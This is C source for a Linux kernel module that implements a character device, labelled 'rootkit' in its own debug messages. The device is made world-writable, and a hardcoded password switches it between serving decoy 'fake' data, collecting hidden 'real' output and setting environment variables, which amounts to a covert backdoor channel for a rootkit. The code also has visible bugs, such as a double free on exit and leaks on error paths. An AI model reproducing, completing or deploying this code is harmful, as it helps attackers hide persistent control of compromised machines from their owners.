#include "drivers.h"


struct file_operations shell_fops =
{
    .owner = THIS_MODULE,
    .open = shell_open,
    .release = shell_close,
    .read = shell_read,
    .write = shell_write
};

struct shell_driver_data driver_data;

static dev_t shell_driver; 

static struct class *shell_class; 

bool init_shell_device(void) {

    if (alloc_chrdev_region(&shell_driver, 0, 1, SHELL_DEV_NAME "-driver") < 0)
    {
        return false;
    }
    if (IS_ERR(shell_class = class_create(THIS_MODULE, SHELL_DEV_NAME "-driver")))
    {
        unregister_chrdev_region(shell_driver, 1);
        return false;
    }
    shell_class->dev_uevent = shell_uevent;
    if (IS_ERR(device_create(shell_class, NULL, shell_driver, NULL, SHELL_DEV_NAME)))
    {
        class_destroy(shell_class);
        unregister_chrdev_region(shell_driver, 1);
        return false;
    }

    cdev_init(&driver_data.cdev, &shell_fops);
    if (cdev_add(&driver_data.cdev, shell_driver, 1) < 0)
    {
        device_destroy(shell_class, shell_driver);
        class_destroy(shell_class);
        unregister_chrdev_region(shell_driver, 1);
        return false;
    }

    mutex_init(&driver_data.mutex);

    return true;

}

void exit_shell_device(void) {
    u32 i;
    cdev_del(&driver_data.cdev);
    device_destroy(shell_class, shell_driver);
    class_destroy(shell_class);
    unregister_chrdev_region(shell_driver, 1);

    kfree(driver_data.output);
    if (driver_data.env) {
        for (i = 0; i < driver_data.env_count; i++) {
            kfree(driver_data.env[i]);
        }
    }
    kfree(driver_data.env);
    kfree(driver_data.fake);
    kfree(driver_data.output);
}


int shell_open(struct inode *inode, struct file *f)
{
    struct shell_driver_data* data;
    data = container_of(inode->i_cdev, struct shell_driver_data, cdev);
    f->private_data = data;
    

    DEBUG_PUTS("rootkit: opened shell driver\n");
    return 0;
}
int shell_close(struct inode *inode, struct file *f)
{
    DEBUG_PUTS("rootkit: closed shell driver\n");
    return 0;
}
ssize_t shell_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
    struct shell_driver_data* data;
    u32 last_ind = len; 
    u32 to_send;
    data = (struct shell_driver_data*) f->private_data;

    down_read(&f->f_inode->i_rwsem);
    if (!data->fake || *off > data->fake_len || data->fake_len == 0) {
        up_read(&f->f_inode->i_rwsem);
        return 0;
    }

    if (last_ind >= data->fake_len) {
        last_ind = data->fake_len - 1;
    }
    to_send = last_ind - *off;

    if (copy_to_user(buf, data->fake + *off, to_send) != 0) {
        up_read(&f->f_inode->i_rwsem);
        return -EFAULT;
    }
    DEBUG_PRINTF("rootkit: reading %u bytes from shell driver\n", to_send);
    *off = last_ind;
    up_read(&f->f_inode->i_rwsem);
    return to_send;
}
ssize_t shell_write(struct file *f, const char __user *user_buf, size_t len,
    loff_t *off)
{
    static char* password = "password\0";
    static shell_mode_t mode = FAKE;
    u32 password_len = strlen(password);
    struct shell_driver_data* data;
    char* buffer;
    char* new_buffer;
    u32 env_count;
    u32 i, j;
    u32 start;

    DEBUG_PUTS("rootkit: write\n");
    data = (struct shell_driver_data*) f->private_data;

    buffer = kmalloc(len + 1, GFP_KERNEL);
    if (!buffer) {
        return -EFAULT;
    }

    if (copy_from_user(buffer, user_buf, len) != 0) {
        return -EFAULT;
    }


    if (len >= password_len && strncmp(password, buffer, password_len) == 0) {
        if (mode == FAKE) {
            mode = OUTPUT;
        } else if (mode == OUTPUT) {
            mode = ENV;
        }
        kfree(buffer);
        DEBUG_PUTS("rootkit: changing shell mode\n");
        return len;
    }
 
    if (mode == FAKE) {
        down_write(&f->f_inode->i_rwsem);
        kfree(data->fake);
        data->fake = buffer;
        data->fake_len = len;
        up_write(&f->f_inode->i_rwsem);
        DEBUG_PUTS("rootkit: writing fake data\n");
        return len;
    }

    mutex_lock(&data->mutex);
    if (mode == OUTPUT) {
        DEBUG_PRINTF("LEN: %d", len);
        if (!data->output) {
            data->output = buffer;
            data->output_len = len;
            data->output[len] = '\0';
            mutex_unlock(&data->mutex);
            return len;
        }
        new_buffer = kmalloc(len + data->output_len + 1, GFP_KERNEL);
        if (!new_buffer) {
            kfree(buffer);
            mutex_unlock(&data->mutex);
            return -EFAULT;
        }
        memcpy(new_buffer, data->output, data->output_len);
        memcpy(new_buffer + data->output_len, buffer, len);
        new_buffer[len + data->output_len] = '\0';
        kfree(data->output);
        kfree(buffer);
        data->output_len = len + data->output_len + 1;
        data->output = new_buffer;
        mutex_unlock(&data->mutex);
        DEBUG_PUTS("rootkit: writing real data\n");
        return len;
        
    }
    

    env_count = 0;
    for (i = 0; i < len; i++) {
        if (buffer[i] == '\n') {
            env_count++;
        }
    }

    if (data->env) {
        for (i = 0; i < data->env_count; i++) {
            kfree(data->env[i]);
        }
    }
    kfree(data->env);
    data->env = kmalloc(sizeof(char*) * (env_count + 1), GFP_KERNEL);
    if (!data->env) {
        mutex_unlock(&data->mutex);
        return -EFAULT;
    }
    data->env[env_count] = NULL;

    data->env_count = env_count;

    start = 0;
    j = 0;
    for (i = 0; i < len; i++) {
        if (buffer[i] == '\n') {
            data->env[j] = kmalloc(i - start + 1, GFP_KERNEL);
            if (!data->env[j]) {
                for (; j > 0; j--) {
                    kfree(data->env[j-1]);
                }
                kfree(data->env);
                mutex_unlock(&data->mutex);
                return -EFAULT;
            }
            data->env[j][i-start] = '\0';
            memcpy(data->env[j], buffer + start, i - start);
            start = i+1;
            j++;
        }
    }

    mutex_unlock(&data->mutex);

    kfree(buffer);

    mode = FAKE;

    DEBUG_PUTS("rootkit: writing env variables\n");
    return len;
}

int shell_uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}